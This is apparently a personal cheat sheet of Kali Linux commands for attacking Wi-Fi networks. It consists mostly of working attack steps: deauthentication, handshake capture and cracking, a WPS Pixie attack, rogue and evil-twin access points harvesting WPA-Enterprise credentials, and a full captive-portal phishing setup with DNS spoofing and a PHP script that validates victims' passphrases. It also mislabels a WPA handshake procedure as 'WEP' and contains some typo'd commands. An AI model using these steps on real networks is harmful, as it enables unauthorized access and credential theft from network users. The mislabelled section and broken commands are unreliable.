
|     |     |
| --- | --- |
|     |     |
## Configuration
```shell
# Check NIC driver
kali@kali:~$ sudo airmon-ng

# List detailed information
kali@kali:~$ sudo lsusb -vv

# Display kernel module parameters
kali@kali:~$ sudo modinfo <driver>
# driver from airmon-ng output

# Modify kernel module parameters
kali@kali:~$ sudo modprobe ath9k_htc blink=0

# List all loaded modules
kali@kali:~$ lsmod

# Remove modules
kali@kali:~$ sudo rmmod ath9k_htc ath9k_common ath9k_hw ath

# Check capabilities of wireless devices/interfaces
kali@kali:~$ iwconfig # deprecated
kali@kali:~$ sudo iwlist wlan0 frequency # deprecated
kali@kali:~$ sudo iw list 

# List Wireless Networks in range (with channel)
kali@kali:~$ sudo iw dev wlan0 scan | grep SSID
kali@kali:~$ sudo iw dev wlan0 scan | egrep "DS Parameter set|SSID:"

# Create new Virtual Interface (VIF) in monitor mode
kali@kali:~$ sudo iw dev wlan0 interface add wlan0mon type monitor
kali@kali:~$ sudo ip link set wlan0mon up
kali@kali:~$ sudo iw dev wlan0mon info
# can test with sudo tcpdump -i wlan0mon

# Set Regulatory Domain
kali@kali:~$ sudo iw reg get
kali@kali:~$ sudo nano /etc/default/crda

# Display all enabled Wi-Fi and Bluetooth devices on the system
kali@kali:~$ sudo rfkill list

# Set up Monitor Mode for WireShark
kali@kali:~$ sudo ip link set wlan0 down
kali@kali:~$ sudo iwconfig wlan0 mode monitor
kali@kali:~$ sudo ip link set wlan0 up

# Channel Hop Scan
kali@kali:~$ sudo airodump-ng wlan0mon
```

## Wireless Tools
```shell
# Check and kill for interfering processes
kali@kali:~$ sudo airmon-ng check
kali@kali:~$ sudo airmon-ng check kill

# Start monitor mode on wlan0mon (new interface)
kali@kali:~$ sudo airmon-ng start wlan0 <channel-num>

# Disable monitor mode
kali@kali:~$ sudo airmon-ng stop wlan0mon

# Sniffing 
kali@kali:~$ sudo airodump-ng wlan0mon -c <channel-num> -w cap1

# Card-to-Card Injection Test
kali@kali:~$ sudo aireplay-ng -9 -i wlan1mon wlan0mon

# Remove wireless headers from undecrypted capture files
kali@kali:~$ sudo airdecap-ng -b <access-point-MAC> <capture.cap>

# G
```

## WEP Full Steps
```shell
# Setup monitor mode and identify target AP
kali@kali:~$ sudo airmon-ng check kill
kali@kali:~$ sudo airmon-ng start wlan0
kali@kali:~$ sudo airodump-ng wlan0mon

# Capture target AP
kali@kali:~$ sudo airodump-ng -c <channel-num> --wps -w capture --eesid <ESSID> --bssid <BSSID> wlan0mon

# Deauthentication Attack (in a new terminal)
kali@kali:~$ sudo aireplay-ng -0 1 -a <BSSID> -c <CLIENT-MAC> wlan0mon

# Handshake Captured on Airodump-Ng, Crack handshake
kali@kali:~$ aircrack-ng -w /usr/share/wordlists/rockyou.txt -e <ESSID> -b <BSSID> capture-01.cap

# Decrypt traffic using found key
kali@kali:~$ airdecap-ng -b <BSSID> -e <ESSID> -p <key> wpa-01.cap

# Convert handshake to HCCAPx
kali@kali:~$ /usr/lib/hashcat-utils/cap2hhccapx.bin capture-01.cap output.hccapx
# Or upload file to https://hashcat.net/cat2hashcat

# Crack with Hashcat
kali@kali:~$ hashcat -m 2500 output.hccapx /usr/share/wordlists/rockyou.txt
kali@kali:~$ hashcat -a 0 -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

## WPS Attack
```shell
# Scan for APs
kali@kali:~$ wash -i wlan0mon <-5>

# PixieWPS Attack (-K)
kali@kali:~$ sudo reaver -b <BSSID> -i wlan0mon -v -K <-c channel-num>
```

## Rogue Access Point Attack
```shell
# Gather information
kali@kali:~$ sudo airodump-ng -w discovery --output-format pcap wlan0mon
# Search pcap file for wlan.fc.type_subtype == 0x08 && wlan.ssid == ""

# Example conf file for hostapd-mana
## Copy from the pcap file
kali@kali:~$ cat Mostar-mana.conf
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/mostar.hccapx

# Setup Rogue AP to capture handshakes to mostar.hccapx
kali@kali:~$ sudo hostapd-mana Mostar-mana.conf

# Deuathenticate attack (if needed)
kali@kali:~$ sudo aireplay-ng -0 0 -a <BSSID> wlan0mon

# Crack the keys
kali@kali:~$ aircrack-ng mostar.hccapx -e Mostar -w /usr/share/wordlists/rockyou.txt
```

## Captive Portal Attack
```shell
# Gather information
kali@kali:~$ sudo airodump-ng -w discovery --output-format pcap wlan0mon

# Deauthenticate attack to capture handshake
kali@kali:~$ sudo aireplay-ng -0 0 -a <BSSID> wlan0mon

# Setup Captive Portal
kali@kali:~$ sudo apt install apache2 libapache2-mod-php
kali@kali:~$ wget -r -l2 <website base>
kali@kali:~$ cat index.php # self-made portal
kali@kali:~$ sudo cp -r /<website-base>/assets/ /var/www/html/portal/
kali@kali:~$ sudo cp -r /<website-base>/old-site/ /var/www/html/portal/
kali@kali:~$ cat login_check.php # self-made php script

# Setup networking
kali@kali:~$ sudo ip addr add 192.168.87.1/24 dev wlan0
kali@kali:~$ sudo ip link set wlan0 up
kali@kali:~$ sudo apt install dnsmasq
kali@kali:~$ cat mco-dnsmasq.conf
# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
# since the DNS responses will be spoofed
listen-address=192.168.87.1

# DHCP range
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100

# This should cover most queries
# We can add 'log-queries' to log DNS queries
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1

# Entries for Windows 7 and 10 captive portal detection
address=/dns.msftncsi.com/131.107.255.255
### EOF ###

kali@kali:~$ sudo dnsmasq --conf-file=mco-dnsmasq.conf
kali@kali:~$ sudo apt install nftables
kali@kali:~$ sudo nft add table ip nat
kali@kali:~$ sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
kali@kali:~$ sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
kali@kali:~$ cat /etc/apache2/sites-enabled/000-default.conf
...
  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]

</VirtualHost>EOF>
### EOF ###

kali@kali:~$ sudo a2enmod rewrite
kali@kali:~$ sudo a2enmod alias
kali@kali:~$ cat /etc/apache2/sites-enabled/000-default.conf # IF HTTPS
<VirtualHost *:443>

  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 https://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt https://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt https://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L]

  # Use existing snakeoil certificates
  SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem
  SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
</VirtualHost>
### EOF ###

kali@kali:~$ sudo a2enmod ssl
kali@kali:~$ sudo systemctl restart apache2

# Setup and Run Rogue AP
kali@kali:~$ sudo hostapd -B mco-hostapd.conf
kali@kali:~$ sudo find /tmp/ -iname passphrase.txt
```
### Example index.php
```html
<!DOCTYPE html>
<html lang="en">

	<head>
		<link href="assets/css/style.css" rel="stylesheet">
		<title>MegaCorp One - Nanotechnology Is the Future</title>
	</head>
	<body style="background-color:#000000;">
		<div class="navbar navbar-default navbar-fixed-top" role="navigation">
			<div class="container">
				<div class="navbar-header">
					<a class="navbar-brand" style="font-family: 'Raleway', sans-serif;font-weight: 900;" href="index.php">MegaCorp One</a>
				</div>
			</div>
		</div>

		<div id="headerwrap" class="old-bd">
			<div class="row centered">
				<div class="col-lg-8 col-lg-offset-2">
					<?php
						if (isset($_GET["success"])) {
							echo '<h3>Login successful</h3>';
							echo '<h3>You may close this page</h3>';
						} else {
							if (isset($_GET["failure"])) {
								echo '<h3>Invalid network key, try again</h3><br/><br/>';
							}
					?>
				<h3>Enter network key</h3><br/><br/>
				<form action="login_check.php" method="post">
					<input type="password" id="passphrase" name="passphrase"><br/><br/>
					<input type="submit" value="Connect"/>
				</form>
				<?php
						}
				?>
				</div>

				<div class="col-lg-4 col-lg-offset-4 himg ">
					<i class="fa fa-cog" aria-hidden="true"></i>
				</div>
			</div>
		</div>

	</body>
</html>
```
### Example login_check.php
```php
<?php
# Path of the handshake PCAP
$handshake_path = '/home/kali/discovery-01.cap';
# ESSID
$essid = 'MegaCorp One Lab';
# Path where a successful passphrase will be written
# Apache2's user must have write permissions
# For anything under /tmp, it's actually under a subdirectory
#  in /tmp due to Systemd PrivateTmp feature:
#  /tmp/systemd-private-$(uuid)-${service_name}-${hash}/$success_path
# See https://www.freedesktop.org/software/systemd/man/systemd.exec.html
$success_path = '/tmp/passphrase.txt';
# Passphrase entered by the user
$passphrase = $_POST['passphrase'];

# Make sure passphrase exists and
# is within passphrase lenght limits (8-63 chars)
if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
  header('Location: index.php?failure');
  die();
}

# Check if the correct passphrase has been found already ...
$correct_pass = file_get_contents($success_path);
if ($correct_pass !== FALSE) {

  # .. and if it matches the current one,
  # then redirect the client accordingly
  if ($correct_pass == $passphrase) {
    header('Location: index.php?success');
  } else {
    header('Location: index.php?failure');
  }
  die();
}

# Add passphrase to wordlist ...
$wordlist_path = tempnam('/tmp', 'wordlist');
$wordlist_file = fopen($wordlist_path, "w");
fwrite($wordlist_file, $passphrase);
fclose($wordlist_file);

# ... then crack the PCAP with it to see if it matches
# If ESSID contains single quotes, they need escaping
exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
" -w " . $wordlist_path . " " . $handshake_path, $output, $retval);

$key_found = FALSE;
# If the exit value is 0, aircrack-ng successfully ran
# We'll now have to inspect output and search for
# "KEY FOUND" to confirm the passphrase was correct
if ($retval == 0) {
	foreach($output as $line) {
		if (strpos($line, "KEY FOUND") !== FALSE) {
			$key_found = TRUE;
			break;
		}
	}
}

if ($key_found) {

  # Save the passphrase and redirect the user to the success page
  @rename($wordlist_path, $success_path);

  header('Location: index.php?success');
} else {
  # Delete temporary file and redirect user back to login page
  @unlink($wordlist_file);

  header('Location: index.php?failure');
}
?>
```

## WPA Attack
```shell
# Gather information
kali@kali:~$ sudo airodump-ng wlan0mon
# AUTH MGT = WPA Enterprise

# Setup FreeRADIUS Server
kali@kali:~$ sudo apt install freeradius
kali@kali:~$ sudo nano /etc/freeradius/3.0/certs/na.cnf # change to same as target CA certificate
kali@kali:~$ sudo nano server.cnf # change to same as target server

# Generate Cert
kali@kali:~$ cd /etc/freeradius/3.0/certs
kali@kali:~$ rm dh
kali@kali:~$ make

# Setup HostAPD Mana
kali@kali:~$ sudo apt install hostapd-mana
kali@kali:~$ nano /etc/hostapd-mana/mana.conf
# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
### EOF ###

kali@kali:~$ nano /etc/hostapd-mana/mana.eap_user 
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]

kali@kali:~$ sudo hostapd-mana /etc/hostapd-mana/mana.conf 
# Run in background using -B
# Crack password hash using the copy/paste output for asleap and append -W <wordlist>
```
